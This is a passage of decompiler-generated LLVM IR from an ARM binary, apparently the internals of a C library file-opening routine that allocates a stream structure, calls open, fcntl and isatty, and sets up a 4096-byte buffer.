  br i1 %v2_1633c, label %dec_label_pc_16344, label %dec_label_pc_16380

dec_label_pc_16344:                               ; preds = %.thread3
  store i32 68, i32* @r0, align 4
  %v0_16348 = call i32 @malloc()
  store i32 %v0_16348, i32* %r0.global-to-local, align 4
  store i32 %v0_16348, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_1634c = icmp eq i32 %v0_16348, 0
  br i1 %v3_1634c, label %dec_label_pc_166c0, label %dec_label_pc_16354

dec_label_pc_16354:                               ; preds = %dec_label_pc_16344
  %v0_16358 = load i32, i32* @r8, align 4
  %v2_16358 = add i32 %v0_16358, -33136
  store i32 %v2_16358, i32* %r3.global-to-local, align 4
  %v1_1635c = inttoptr i32 %v2_16358 to i32*
  %v2_1635c = load i32, i32* %v1_1635c, align 4
  store i32 %v2_1635c, i32* %r0.global-to-local, align 4
  %v3_1635c = add i32 %v0_16358, -33132
  %v4_1635c = inttoptr i32 %v3_1635c to i32*
  %v5_1635c = load i32, i32* %v4_1635c, align 4
  store i32 %v5_1635c, i32* @r1, align 4
  %v6_1635c = add i32 %v0_16358, -33128
  %v7_1635c = inttoptr i32 %v6_1635c to i32*
  %v8_1635c = load i32, i32* %v7_1635c, align 4
  store i32 %v8_1635c, i32* %r2.global-to-local, align 4
  %v2_16368 = add i32 %v0_16348, 8
  %v3_16368 = inttoptr i32 %v2_16368 to i32*
  store i32 0, i32* %v3_16368, align 4
  %v2_16370 = load i32, i32* @r5, align 4
  %v3_16370 = inttoptr i32 %v2_16370 to i16*
  store i16 8192, i16* %v3_16370, align 2
  %v2_16374 = load i32, i32* %r0.global-to-local, align 4
  %v0_16378 = load i32, i32* @r5, align 4
  %v1_16378 = add i32 %v0_16378, 56
  store i32 %v1_16378, i32* @r3, align 4
  %v1_1637c = inttoptr i32 %v1_16378 to i32*
  store i32 %v2_16374, i32* %v1_1637c, align 4
  %v3_1637c = add i32 %v0_16378, 60
  %v4_1637c = inttoptr i32 %v3_1637c to i32*
  %v5_1637c = load i32, i32* @r1, align 4
  store i32 %v5_1637c, i32* %v4_1637c, align 4
  %v6_1637c = add i32 %v0_16378, 64
  %v7_1637c = inttoptr i32 %v6_1637c to i32*
  %v8_1637c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1637c, i32* %v7_1637c, align 4
  %v0_16380.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16380

dec_label_pc_16380:                               ; preds = %.thread3, %dec_label_pc_16354
  %v0_163d8 = phi i32 [ %v0_162c4, %.thread3 ], [ %v0_16380.pre, %dec_label_pc_16354 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16380 = icmp slt i32 %v0_163d8, 0
  br i1 %v1_16380, label %dec_label_pc_163d8, label %dec_label_pc_16388

dec_label_pc_16388:                               ; preds = %dec_label_pc_16380
  %v0_1638c = load i32, i32* @r4, align 4
  %v2_1638c = and i32 %v0_1638c, 131075
  %v1_16390 = add nuw nsw i32 %v2_1638c, 1
  store i32 %v1_16390, i32* %r2.global-to-local, align 4
  %v0_16394 = load i32, i32* @r7, align 4
  %v1_16394 = add i32 %v0_16394, 1
  %v2_16398 = and i32 %v1_16394, %v1_16390
  store i32 %v2_16398, i32* %r3.global-to-local, align 4
  %v3_1639c = icmp uge i32 %v2_16398, %v1_16390
  store i1 %v3_1639c, i1* %cpsr_c.global-to-local, align 1
  %v9_1639c = icmp eq i32 %v2_16398, %v1_16390
  %v1_163a0 = load i32, i32* @r5, align 4
  %v2_163a0 = add i32 %v1_163a0, 4
  %v3_163a0 = inttoptr i32 %v2_163a0 to i32*
  store i32 %v0_163d8, i32* %v3_163a0, align 4
  br i1 %v9_1639c, label %dec_label_pc_163a8, label %dec_label_pc_162e4

dec_label_pc_163a8:                               ; preds = %dec_label_pc_16388
  %v0_163a8 = load i32, i32* @r4, align 4
  %v1_163a8 = load i32, i32* @r7, align 4
  %v2_163a8 = sub i32 -1, %v1_163a8
  %v3_163a8 = and i32 %v0_163a8, %v2_163a8
  store i32 %v3_163a8, i32* @r3, align 4
  %v1_163ac = and i32 %v3_163a8, 1024
  %v2_163ac = icmp eq i32 %v1_163ac, 0
  br i1 %v2_163ac, label %dec_label_pc_163cc, label %dec_label_pc_163b4

dec_label_pc_163b4:                               ; preds = %dec_label_pc_163a8
  %v0_163b4 = load i32, i32* @r6, align 4
  store i32 %v0_163b4, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_163c0 = call i32 @__libc_fcntl(i32 %v0_163b4, i32 4)
  store i32 %v2_163c0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_163c4 = icmp eq i32 %v2_163c0, 0
  br i1 %v2_163c4, label %dec_label_pc_163b4.dec_label_pc_163cc_crit_edge, label %dec_label_pc_162e4

dec_label_pc_163b4.dec_label_pc_163cc_crit_edge:  ; preds = %dec_label_pc_163b4
  %v0_163cc.pre = load i32, i32* @r7, align 4
  %v0_163d0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_163cc

dec_label_pc_163cc:                               ; preds = %dec_label_pc_163b4.dec_label_pc_163cc_crit_edge, %dec_label_pc_163a8
  %v0_163d0 = phi i32 [ %v0_163d0.pre, %dec_label_pc_163b4.dec_label_pc_163cc_crit_edge ], [ %v0_163a8, %dec_label_pc_163a8 ]
  %v0_163cc = phi i32 [ %v0_163cc.pre, %dec_label_pc_163b4.dec_label_pc_163cc_crit_edge ], [ %v1_163a8, %dec_label_pc_163a8 ]
  %v1_163cc = and i32 %v0_163cc, 131072
  store i32 %v1_163cc, i32* %r3.global-to-local, align 4
  %v2_163d0 = or i32 %v1_163cc, %v0_163d0
  store i32 %v2_163d0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_163fc

dec_label_pc_163d8:                               ; preds = %dec_label_pc_16380
  %v2_163d8 = icmp eq i32 %v0_163d8, -1
  store i1 %v2_163d8, i1* %cpsr_c.global-to-local, align 1
  %v7_163d8 = icmp eq i32 %v0_163d8, -1
  %v0_163e4.pre = load i32, i32* @r4, align 4
  br i1 %v7_163d8, label %dec_label_pc_163d8._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_163d8
  %v2_163dc = or i32 %v0_163e4.pre, 131072
  store i32 %v2_163dc, i32* @r4, align 4
  br label %dec_label_pc_163d8._crit_edge

dec_label_pc_163d8._crit_edge:                    ; preds = %dec_label_pc_163d8, %bb53
  %v0_163e4 = phi i32 [ %v2_163dc, %bb53 ], [ %v0_163e4.pre, %dec_label_pc_163d8 ]
  %v0_163e0 = load i32, i32* @r7, align 4
  store i32 %v0_163e0, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_163ec = call i32 @__libc_open(i32 %v0_163e0, i32 %v0_163e4)
  store i32 %v2_163ec, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_163f0 = icmp slt i32 %v2_163ec, 0
  %v1_163f4 = load i32, i32* @r5, align 4
  %v2_163f4 = add i32 %v1_163f4, 4
  %v3_163f4 = inttoptr i32 %v2_163f4 to i32*
  store i32 %v2_163ec, i32* %v3_163f4, align 4
  br i1 %v1_163f0, label %dec_label_pc_16300, label %.dec_label_pc_163fc_crit_edge

.dec_label_pc_163fc_crit_edge:                    ; preds = %dec_label_pc_163d8._crit_edge
  %v0_16400.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_163fc

dec_label_pc_163fc:                               ; preds = %.dec_label_pc_163fc_crit_edge, %dec_label_pc_163cc
  %v0_16418 = phi i32 [ %v0_16400.pre, %.dec_label_pc_163fc_crit_edge ], [ %v2_163d0, %dec_label_pc_163cc ]
  %v0_163fc = load i32, i32* @r5, align 4
  %v1_163fc = inttoptr i32 %v0_163fc to i16*
  %v2_163fc = load i16, i16* %v1_163fc, align 2
  %v3_163fc = zext i16 %v2_163fc to i32
  %v1_16400 = urem i32 %v0_16418, 4
  %v1_16404 = and i32 %v0_16418, 1024
  %v1_16408 = and i32 %v3_163fc, 8192
  %v1_1640c = add nuw nsw i32 %v1_16400, 1
  %v2_16410 = or i32 %v1_16408, %v1_16404
  store i32 %v2_16410, i32* %r3.global-to-local, align 4
  %v1_16414 = xor i32 %v1_1640c, 3
  %v1_16418 = and i32 %v0_16418, 131072
  store i32 %v1_16418, i32* %r2.global-to-local, align 4
  %v2_16418 = icmp eq i32 %v1_16418, 0
  %v1_1641c = add i32 %v0_163fc, 4
  %v2_1641c = inttoptr i32 %v1_1641c to i32*
  %v3_1641c = load i32, i32* %v2_1641c, align 4
  store i32 %v3_1641c, i32* @r4, align 4
  br i1 %v2_16418, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_163fc
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_163fc, %bb54
  %v0_16428 = phi i32 [ 0, %dec_label_pc_163fc ], [ 32768, %bb54 ]
  %v4_16424 = mul nuw nsw i32 %v1_16414, 16
  %v5_16424 = or i32 %v2_16410, %v4_16424
  store i32 %v5_16424, i32* %r3.global-to-local, align 4
  %v2_16428 = or i32 %v0_16428, %v5_16424
  store i32 %v2_16428, i32* %r2.global-to-local, align 4
  %v2_1642c = icmp ugt i32 %v3_1641c, 2147483646
  store i1 %v2_1642c, i1* %cpsr_c.global-to-local, align 1
  %v8_1642c = icmp eq i32 %v3_1641c, 2147483647
  %v1_16430 = trunc i32 %v2_16428 to i16
  store i16 %v1_16430, i16* %v1_163fc, align 2
  br i1 %v8_1642c, label %dec_label_pc_16470, label %dec_label_pc_16438

dec_label_pc_16438:                               ; preds = %bb55
  store i32 48724, i32* %r3.global-to-local, align 4
  %v0_1643c = call i32 @__aeabi_read_tp()
  %v3_16440 = load i16, i16* @global_var_2229c.359, align 2
  %v4_16440 = sext i16 %v3_16440 to i32
  store i32 %v4_16440, i32* @r3, align 4
  store i32 %v0_1643c, i32* @r6, align 4
  %v0_16448 = load i32, i32* @r4, align 4
  store i32 %v0_16448, i32* @r0, align 4
  %v2_1644c = add i32 %v4_16440, %v0_1643c
  %v3_1644c = inttoptr i32 %v2_1644c to i32*
  %v4_1644c = load i32, i32* %v3_1644c, align 4
  store i32 %v4_1644c, i32* @r4, align 4
  %v1_16450 = call i32 @isatty(i32 %v0_16448)
  store i32 %v1_16450, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16454 = icmp eq i32 %v1_16450, 0
  br i1 %v2_16454, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_16438
  %v1_16458 = load i32, i32* @r5, align 4
  %v2_16458 = inttoptr i32 %v1_16458 to i16*
  %v3_16458 = load i16, i16* %v2_16458, align 2
  %v4_16458 = zext i16 %v3_16458 to i32
  %v2_1645c = or i32 %v4_16458, 256
  store i32 %v2_1645c, i32* %r3.global-to-local, align 4
  %v2_16460 = trunc i32 %v2_1645c to i16
  store i16 %v2_16460, i16* %v2_16458, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_16438, %bb56
  %v3_16468 = load i16, i16* @global_var_2229c.359, align 2
  %v4_16468 = sext i16 %v3_16468 to i32
  store i32 %v4_16468, i32* %r3.global-to-local, align 4
  %v0_1646c = load i32, i32* @r4, align 4
  %v1_1646c = load i32, i32* @r6, align 4
  %v3_1646c = add i32 %v1_1646c, %v4_16468
  %v4_1646c = inttoptr i32 %v3_1646c to i32*
  store i32 %v0_1646c, i32* %v4_1646c, align 4
  br label %dec_label_pc_16470

dec_label_pc_16470:                               ; preds = %bb55, %.thread5
  %v0_16470 = load i32, i32* @r5, align 4
  %v1_16470 = add i32 %v0_16470, 8
  %v2_16470 = inttoptr i32 %v1_16470 to i32*
  %v3_16470 = load i32, i32* %v2_16470, align 4
  store i32 %v3_16470, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16474 = icmp eq i32 %v3_16470, 0
  br i1 %v2_16474, label %dec_label_pc_1647c, label %bb57

dec_label_pc_1647c:                               ; preds = %dec_label_pc_16470
  store i32 4096, i32* @r0, align 4
  %v0_16480 = call i32 @malloc()
  store i32 %v0_16480, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16484 = icmp eq i32 %v0_16480, 0
  %v1_16494.pre = load i32, i32* @r5, align 4
  br i1 %v2_16484, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1647c
  %v2_16488 = inttoptr i32 %v1_16494.pre to i16*
  %v3_16488 = load i16, i16* %v2_16488, align 2
  %v4_16488 = zext i16 %v3_16488 to i32
  %v2_1648c = add i32 %v0_16480, 4096
  store i32 %v2_1648c, i32* %r2.global-to-local, align 4
  %v2_16490 = or i32 %v4_16488, 16384
  store i32 %v2_16490, i32* %r3.global-to-local, align 4
  %v2_16494 = add i32 %v1_16494.pre, 8
  %v3_16494 = inttoptr i32 %v2_16494 to i32*
  store i32 %v0_16480, i32* %v3_16494, align 4
  %v1_16498 = load i32, i32* %r2.global-to-local, align 4
  %v2_16498 = load i32, i32* @r5, align 4
  %v3_16498 = add i32 %v2_16498, 12
  %v4_16498 = inttoptr i32 %v3_16498 to i32*
  store i32 %v1_16498, i32* %v4_16498, align 4
  %v1_1649c = load i32, i32* %r3.global-to-local, align 4
  %v2_1649c = trunc i32 %v1_1649c to i16
  %v3_1649c = load i32, i32* @r5, align 4
  %v4_1649c = inttoptr i32 %v3_1649c to i16*
  store i16 %v2_1649c, i16* %v4_1649c, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_1647c
  %v2_1649437 = add i32 %v1_16494.pre, 8
  %v3_1649438 = inttoptr i32 %v2_1649437 to i32*
  store i32 0, i32* %v3_1649438, align 4
  %v2_164a0 = load i32, i32* @r5, align 4
  %v3_164a0 = add i32 %v2_164a0, 12
  %v4_164a0 = inttoptr i32 %v3_164a0 to i32*
  store i32 0, i32* %v4_164a0, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %dec_label_pc_16470, %.thread9
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_164ac = load i32, i32* @r8, align 4
  %v2_164ac = add i32 %v0_164ac, 92
  %v3_164ac = inttoptr i32 %v2_164ac to i32*
  %v4_164ac = load i32, i32* %v3_164ac, align 4
  store i32 %v4_164ac, i32* %r3.global-to-local, align 4
  %v2_164b0 = load i32, i32* @r5, align 4
  %v3_164b0 = add i32 %v2_164b0, 2
  %v4_164b0 = inttoptr i32 %v3_164b0 to i8*
  store i8 0, i8* %v4_164b0, align 1
  %v0_164b4 = load i32, i32* @r5, align 4
  %v1_164b4 = inttoptr i32 %v0_164b4 to i16*
  %v2_164b4 = load i16, i16* %v1_164b4, align 2
  %v3_164b4 = zext i16 %v2_164b4 to i32
  store i32 %v3_164b4, i32* %r2.global-to-local, align 4
  %v0_164b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_164b8 = inttoptr i32 %v0_164b8 to i32*
  %v2_164b8 = load i32, i32* %v1_164b8, align 4
  store i32 %v2_164b8, i32* @r1, align 4
  %v1_164bc = add i32 %v0_164b4, 8
  %v2_164bc = inttoptr i32 %v1_164bc to i32*
  %v3_164bc = load i32, i32* %v2_164bc, align 4
  store i32 %v3_164bc, i32* %r3.global-to-local, align 4
  %v1_164c0 = and i32 %v3_164b4, 8192
  %v2_164c0 = icmp eq i32 %v1_164c0, 0
  %v2_164c4 = add i32 %v0_164b4, 20
  %v3_164c4 = inttoptr i32 %v2_164c4 to i32*
  store i32 %v3_164bc, i32* %v3_164c4, align 4
  %v0_164c8 = load i32, i32* @r1, align 4
  %v1_164c8 = load i32, i32* @r5, align 4
  %v2_164c8 = add i32 %v1_164c8, 52
  %v3_164c8 = inttoptr i32 %v2_164c8 to i32*
  store i32 %v0_164c8, i32* %v3_164c8, align 4
  %v0_164cc = load i32, i32* %r3.global-to-local, align 4
  %v1_164cc = load i32, i32* @r5, align 4
  %v2_164cc = add i32 %v1_164cc, 24
  %v3_164cc = inttoptr i32 %v2_164cc to i32*
  store i32 %v0_164cc, i32* %v3_164cc, align 4
  %v0_164d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_164d0 = load i32, i32* @r5, align 4
  %v2_164d0 = add i32 %v1_164d0, 28
  %v3_164d0 = inttoptr i32 %v2_164d0 to i32*
  store i32 %v0_164d0, i32* %v3_164d0, align 4
  %v0_164d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_164d4 = load i32, i32* @r5, align 4
  %v2_164d4 = add i32 %v1_164d4, 16
  %v3_164d4 = inttoptr i32 %v2_164d4 to i32*
  store i32 %v0_164d4, i32* %v3_164d4, align 4
  %v0_164d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_164d8 = load i32, i32* @r5, align 4
  %v2_164d8 = add i32 %v1_164d8, 44
  %v3_164d8 = inttoptr i32 %v2_164d8 to i32*
  store i32 %v0_164d8, i32* %v3_164d8, align 4
  br i1 %v2_164c0, label %dec_label_pc_166c0, label %dec_label_pc_164e0

dec_label_pc_164e0:                               ; preds = %bb57
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_164e4 = load i32, i32* @r8, align 4
  %v2_164e4 = add i32 %v0_164e4, 160
  %v3_164e4 = inttoptr i32 %v2_164e4 to i32*
  %v4_164e4 = load i32, i32* %v3_164e4, align 4
  store i32 %v4_164e4, i32* %r7.global-to-local, align 4
  %v0_164e8 = call i32 @__aeabi_read_tp()
  store i32 %v0_164e8, i32* %r0.global-to-local, align 4
  %v1_164ec = add i32 %v4_164e4, 8
  %v2_164ec = inttoptr i32 %v1_164ec to i32*
  %v3_164ec = load i32, i32* %v2_164ec, align 4
  store i32 %v3_164ec, i32* %r3.global-to-local, align 4
  %v1_164f0 = add i32 %v0_164e8, -1168
  store i32 %v1_164f0, i32* %r6.global-to-local, align 4
  %v3_164f4 = icmp uge i32 %v3_164ec, %v1_164f0
  store i1 %v3_164f4, i1* %cpsr_c.global-to-local, align 1
  %v9_164f4 = icmp eq i32 %v3_164ec, %v1_164f0
  br i1 %v9_164f4, label %dec_label_pc_16538, label %dec_label_pc_164fc

dec_label_pc_164fc:                               ; preds = %dec_label_pc_164e0
  store i32 %v4_164e4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16504

dec_label_pc_16504:                               ; preds = %dec_label_pc_16510.dec_label_pc_16504_crit_edge, %dec_label_pc_164fc
  %v0_16504 = phi i32 [ %v0_16504.pre, %dec_label_pc_16510.dec_label_pc_16504_crit_edge ], [ %v4_164e4, %dec_label_pc_164fc ]
  %v1_16504 = inttoptr i32 %v0_16504 to i32*
  %v2_16504 = load i32, i32* %v1_16504, align 4
  store i32 %v2_16504, i32* %r3.global-to-local, align 4
  %v1_16508 = load i32, i32* %r4.global-to-local, align 4
  %v3_16508 = icmp uge i32 %v2_16504, %v1_16508
  store i1 %v3_16508, i1* %cpsr_c.global-to-local, align 1
  %v9_16508 = icmp eq i32 %v2_16504, %v1_16508
  br i1 %v9_16508, label %dec_label_pc_16510, label %dec_label_pc_16528

dec_label_pc_16510:                               ; preds = %dec_label_pc_16504
  store i32 %v2_16504, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16520 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16520, label %dec_label_pc_16524, label %dec_label_pc_16510.dec_label_pc_16504_crit_edge

dec_label_pc_16510.dec_label_pc_16504_crit_edge:  ; preds = %dec_label_pc_16510
  %v0_16504.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16504

dec_label_pc_16524:                               ; preds = %dec_label_pc_16510
  %v0_16524 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16524, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16528

dec_label_pc_16528:                               ; preds = %dec_label_pc_16504, %dec_label_pc_16524
  %v0_16528 = phi i32 [ %v0_16524, %dec_label_pc_16524 ], [ %v2_16504, %dec_label_pc_16504 ]
  %v1_16528 = phi i32 [ %v0_16524, %dec_label_pc_16524 ], [ %v1_16508, %dec_label_pc_16504 ]
  %v3_16528 = icmp uge i32 %v0_16528, %v1_16528
  store i1 %v3_16528, i1* %cpsr_c.global-to-local, align 1
  %v9_16528 = icmp eq i32 %v0_16528, %v1_16528
  br i1 %v9_16528, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_16528
  %v1_1652c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1652c, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_16528, %bb58
  %v1_16530 = xor i1 %v9_16528, true
  call void @__pseudo_cond_branch(i1 %v1_16530, i32 ptrtoint (i32* @global_var_14784.527 to i32))
  %v0_16534 = load i32, i32* %r6.global-to-local, align 4
  %v1_16534 = load i32, i32* %r7.global-to-local, align 4
  %v2_16534 = add i32 %v1_16534, 8
  %v3_16534 = inttoptr i32 %v2_16534 to i32*
  store i32 %v0_16534, i32* %v3_16534, align 4
  %v1_16554.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16538

dec_label_pc_16538:                               ; preds = %dec_label_pc_164e0, %bb59
  %v1_16554 = phi i32 [ %v3_164ec, %dec_label_pc_164e0 ], [ %v1_16554.pre, %bb59 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_1653c = load i32, i32* @r8, align 4
  %v2_1653c = add i32 %v0_1653c, 160
  %v3_1653c = inttoptr i32 %v2_1653c to i32*
  %v4_1653c = load i32, i32* %v3_1653c, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_16544 = add i32 %v0_1653c, 152
  %v3_16544 = inttoptr i32 %v2_16544 to i32*
  %v4_16544 = load i32, i32* %v3_16544, align 4
  store i32 %v4_16544, i32* %r7.global-to-local, align 4
  %v1_16548 = add i32 %v4_1653c, 4
  %v2_16548 = inttoptr i32 %v1_16548 to i32*
  %v3_16548 = load i32, i32* %v2_16548, align 4
  store i32 %v3_16548, i32* %r3.global-to-local, align 4
  %v1_1654c = add i32 %v4_16544, 8
  %v2_1654c = inttoptr i32 %v1_1654c to i32*
  %v3_1654c = load i32, i32* %v2_1654c, align 4
  store i32 %v3_1654c, i32* %r2.global-to-local, align 4
  %v1_16550 = add i32 %v3_16548, 1
  store i32 %v1_16550, i32* %r3.global-to-local, align 4
  %v3_16554 = icmp uge i32 %v3_1654c, %v1_16554
  store i1 %v3_16554, i1* %cpsr_c.global-to-local, align 1
  %v9_16554 = icmp eq i32 %v3_1654c, %v1_16554
  store i32 %v1_16550, i32* %v2_16548, align 4
  br i1 %v9_16554, label %dec_label_pc_165a0, label %dec_label_pc_16560

dec_label_pc_16560:                               ; preds = %dec_label_pc_16538
  %v0_16564 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16564, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1656c95 = inttoptr i32 %v0_16564 to i32*
  %v2_1656c96 = load i32, i32* %v1_1656c95, align 4
  store i32 %v2_1656c96, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1657098 = icmp eq i32 %v2_1656c96, 0
  br i1 %v9_1657098, label %dec_label_pc_16578, label %dec_label_pc_16590

dec_label_pc_16578:                               ; preds = %dec_label_pc_16560, %dec_label_pc_16578.dec_label_pc_1656c_crit_edge
  %v0_1657899 = phi i32 [ %v1_16570.pre, %dec_label_pc_16578.dec_label_pc_1656c_crit_edge ], [ 0, %dec_label_pc_16560 ]
  store i32 %v0_1657899, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16588 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16588, label %dec_label_pc_1658c, label %dec_label_pc_16578.dec_label_pc_1656c_crit_edge

dec_label_pc_16578.dec_label_pc_1656c_crit_edge:  ; preds = %dec_label_pc_16578
  %v0_1656c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16570.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1656c = inttoptr i32 %v0_1656c.pre to i32*
  %v2_1656c = load i32, i32* %v1_1656c, align 4
  store i32 %v2_1656c, i32* %r3.global-to-local, align 4
  %v3_16570 = icmp uge i32 %v2_1656c, %v1_16570.pre
  store i1 %v3_16570, i1* %cpsr_c.global-to-local, align 1
  %v9_16570 = icmp eq i32 %v2_1656c, %v1_16570.pre
  br i1 %v9_16570, label %dec_label_pc_16578, label %dec_label_pc_16590

dec_label_pc_1658c:                               ; preds = %dec_label_pc_16578
  %v0_1658c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1658c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16590

dec_label_pc_16590:                               ; preds = %dec_label_pc_16560, %dec_label_pc_16578.dec_label_pc_1656c_crit_edge, %dec_label_pc_1658c
  %v0_16590 = phi i32 [ %v0_1658c, %dec_label_pc_1658c ], [ %v2_1656c96, %dec_label_pc_16560 ], [ %v2_1656c, %dec_label_pc_16578.dec_label_pc_1656c_crit_edge ]
  %v1_16590 = phi i32 [ %v0_1658c, %dec_label_pc_1658c ], [ 0, %dec_label_pc_16560 ], [ %v1_16570.pre, %dec_label_pc_16578.dec_label_pc_1656c_crit_edge ]
  %v3_16590 = icmp uge i32 %v0_16590, %v1_16590
  store i1 %v3_16590, i1* %cpsr_c.global-to-local, align 1
  %v9_16590 = icmp eq i32 %v0_16590, %v1_16590
  br i1 %v9_16590, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_16590
  %v1_16594 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_16594, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_16590, %bb60
  %v1_16598 = xor i1 %v9_16590, true
  call void @__pseudo_cond_branch(i1 %v1_16598, i32 ptrtoint (i32* @global_var_14784.527 to i32))
  %v0_1659c = load i32, i32* %r6.global-to-local, align 4
  %v1_1659c = load i32, i32* %r7.global-to-local, align 4
  %v2_1659c = add i32 %v1_1659c, 8
  %v3_1659c = inttoptr i32 %v2_1659c to i32*
  store i32 %v0_1659c, i32* %v3_1659c, align 4
  br label %dec_label_pc_165a0

dec_label_pc_165a0:                               ; preds = %dec_label_pc_16538, %bb61
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_165a4 = load i32, i32* @r8, align 4
  %v2_165a4 = add i32 %v0_165a4, 152
  %v3_165a4 = inttoptr i32 %v2_165a4 to i32*
  %v4_165a4 = load i32, i32* %v3_165a4, align 4
  store i32 %v4_165a4, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_165ac = add i32 %v0_165a4, 76
  %v3_165ac = inttoptr i32 %v2_165ac to i32*
  %v4_165ac = load i32, i32* %v3_165ac, align 4
  store i32 %v4_165ac, i32* @r1, align 4
  %v1_165b0 = add i32 %v4_165a4, 4
  %v2_165b0 = inttoptr i32 %v1_165b0 to i32*
  %v3_165b0 = load i32, i32* %v2_165b0, align 4
  store i32 %v3_165b0, i32* %r3.global-to-local, align 4
  %v1_165b4 = inttoptr i32 %v4_165ac to i32*
  %v2_165b4 = load i32, i32* %v1_165b4, align 4
  store i32 %v2_165b4, i32* %r2.global-to-local, align 4
  %v1_165b8 = add i32 %v3_165b0, 1
  store i32 %v1_165b8, i32* %r3.global-to-local, align 4
  store i32 %v1_165b8, i32* %v2_165b0, align 4
  %v0_165c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_165c0 = load i32, i32* @r5, align 4
  %v2_165c0 = add i32 %v1_165c0, 32
  %v3_165c0 = inttoptr i32 %v2_165c0 to i32*
  store i32 %v0_165c0, i32* %v3_165c0, align 4
  %v0_165c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_165c4 = add i32 %v0_165c4, 4
  %v2_165c4 = inttoptr i32 %v1_165c4 to i32*
  %v3_165c4 = load i32, i32* %v2_165c4, align 4
  %v1_165c8 = add i32 %v3_165c4, -1
  store i32 %v1_165c8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_165cc = icmp eq i32 %v1_165c8, 0
  %v0_165d0 = load i32, i32* @r5, align 4
  %v1_165d0 = load i32, i32* @r1, align 4
  %v2_165d0 = inttoptr i32 %v1_165d0 to i32*
  store i32 %v0_165d0, i32* %v2_165d0, align 4
  %v0_165d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_165d4 = load i32, i32* %r0.global-to-local, align 4
  %v2_165d4 = add i32 %v1_165d4, 4
  %v3_165d4 = inttoptr i32 %v2_165d4 to i32*
  store i32 %v0_165d4, i32* %v3_165d4, align 4
  br i1 %v2_165cc, label %dec_label_pc_165dc, label %dec_label_pc_1663c

dec_label_pc_165dc:                               ; preds = %dec_label_pc_165a0
  %v0_165dc = load i32, i32* %r3.global-to-local, align 4
  %v1_165dc = load i32, i32* %r0.global-to-local, align 4
  %v2_165dc = add i32 %v1_165dc, 8
  %v3_165dc = inttoptr i32 %v2_165dc to i32*
  store i32 %v0_165dc, i32* %v3_165dc, align 4
  %v0_165e0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_165e0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_165e4

dec_label_pc_165e4:                               ; preds = %dec_label_pc_16614.dec_label_pc_165e4_crit_edge, %dec_label_pc_165dc
  %v0_165e4 = phi i32 [ %v0_165e4.pre, %dec_label_pc_16614.dec_label_pc_165e4_crit_edge ], [ %v0_165e0, %dec_label_pc_165dc ]
